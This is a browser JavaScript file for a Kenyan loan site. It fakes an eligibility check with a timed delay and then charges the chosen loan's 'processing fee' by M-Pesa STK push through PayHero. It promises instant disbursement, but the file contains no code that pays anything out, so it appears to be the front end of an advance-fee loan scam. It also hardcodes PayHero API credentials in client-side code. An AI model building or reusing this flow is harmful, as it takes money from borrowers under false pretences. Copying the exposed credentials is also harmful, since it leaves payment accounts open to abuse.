let currentStep = 1;
let selectedLoan = { amount: 0, fee: 0 };
let userName = '';

document.addEventListener('DOMContentLoaded', () => {
    const eligibilityForm = document.getElementById('eligibility-form');
    const pinInput = document.getElementById('pin-input');
    const pinDots = document.querySelectorAll('.pin-dot');
    const btnStk = document.getElementById('btn-stk');
    const btnCheck = document.getElementById('btn-check');

    // Step 1 Submission
    eligibilityForm.addEventListener('submit', (e) => {
        e.preventDefault();

        // Show loading in button
        const originalContent = btnCheck.innerHTML;
        btnCheck.innerHTML = '<div class="spinner"></div><span>Checking...</span>';
        btnCheck.disabled = true;

        userName = document.getElementById('fullName').value;

        setTimeout(() => {
            document.getElementById('userNameDisplay').textContent = userName.split(' ')[0];
            goToStep(2);
            btnCheck.innerHTML = originalContent;
            btnCheck.disabled = false;
        }, 1500);
    });

    // Removal of Pin Logic Event Listeners

    // Step 2 Selection
    const offerCards = document.querySelectorAll('.offer-card');
    offerCards.forEach(card => {
        card.addEventListener('click', () => {
            selectedLoan.amount = parseInt(card.dataset.amount);
            selectedLoan.fee = parseInt(card.dataset.fee);

            showModal();
        });
    });
});

function goToStep(step) {
    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
    document.getElementById(`step-${step}`).classList.add('active');

    // Progress bar visibility and value
    const progressBar = document.getElementById('progress-bar').parentElement;
    if (step === 0) {
        progressBar.classList.remove('active');
    } else {
        progressBar.classList.add('active');
        const progress = (step / 3) * 100;
        document.getElementById('progress-bar').style.width = `${progress}%`;
    }

    currentStep = step;
    window.scrollTo(0, 0);

    if (step === 3) {
        const phone = document.getElementById('phoneNumber').value;
        const name = document.getElementById('fullName').value;

        document.getElementById('finalAmount').textContent = `Ksh ${selectedLoan.amount.toLocaleString()}`;
        document.getElementById('finalFee').textContent = `Ksh ${selectedLoan.fee.toLocaleString()}`;
        document.getElementById('finalReceive').textContent = `Ksh ${(selectedLoan.amount - selectedLoan.fee).toLocaleString()}`;
        document.getElementById('payment-phone').textContent = phone;

        // Trigger PayHero API Call immediately
        initiatePayHero(selectedLoan.fee, phone, name);
    }
}

async function initiatePayHero(amount, phone, name) {
    const statusTitle = document.getElementById('payment-status-title');
    const statusDesc = document.getElementById('payment-status-desc');
    const statusIcon = document.getElementById('payment-status-icon');
    const loader = document.querySelector('.processing-loader');
    const backBtn = document.getElementById('payment-back-btn');

    try {
        const url = 'https://backend.payhero.co.ke/api/v2/payments';
        // Note: Using the fee as the amount to pay for "processing"

        // --- AUTHENTICATION CONFIG (Replace with your actual keys) ---
        const username = 'jUnCiFRK2GpdfYScccI3';
        const password = 'iM0Wj7DT2ePRULSBGPcvotGdKDnxVV8HjiJV8h5m';
        const channelId = 6020; // Update if your PayHero channel ID is different
        // -----------------------------------------------------------

        const authHeader = 'Basic ' + btoa(username + ':' + password);
        // -----------------------------

        const options = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': authHeader
            },
            body: JSON.stringify({
                "amount": amount,
                "phone_number": phone,
                "channel_id": channelId,
                "provider": "m-pesa",
                "external_reference": `NYOTA-${Date.now()}`,
                "customer_name": name,
                "callback_url": "https://nyotafund.vercel.app/api/callback"
            })
        };

        const response = await fetch(url, options);
        const data = await response.json();

        if (response.ok || data.success) {
            statusTitle.textContent = "STK Push Sent!";
            statusDesc.innerHTML = `Please check your phone and enter your M-Pesa PIN to pay <b>Ksh ${amount}</b>. Your loan of Ksh ${selectedLoan.amount.toLocaleString()} will be disbursed instantly after payment.`;
            statusIcon.style.background = "#14532d";
            statusIcon.innerHTML = '<ion-icon name="checkmark-done-outline" style="font-size: 36px; color: #4ade80;"></ion-icon>';
        } else {
            throw new Error(data.message || "Failed to initiate payment");
        }
    } catch (error) {
        statusTitle.textContent = "Request Failed";
        statusDesc.textContent = "We couldn't reach the payment gateway. Please check your phone number and try again.";
        statusIcon.style.background = "#7f1d1d";
        statusIcon.innerHTML = '<ion-icon name="alert-circle-outline" style="font-size: 36px; color: #f87171;"></ion-icon>';
        console.error('Error:', error);
    } finally {
        loader.style.display = 'none';
        backBtn.style.display = 'block';
    }
}

function showModal() {
    document.getElementById('modal-amount').textContent = `Ksh ${selectedLoan.amount.toLocaleString()}`;
    document.getElementById('modal-fee').textContent = `Ksh ${selectedLoan.fee.toLocaleString()}`;
    document.getElementById('modal-receive').textContent = `Ksh ${(selectedLoan.amount - selectedLoan.fee).toLocaleString()}`;
    document.getElementById('modal-overlay').style.display = 'flex';
}

function closeModal() {
    document.getElementById('modal-overlay').style.display = 'none';
}

function confirmLoan() {
    closeModal();
    goToStep(3);
}
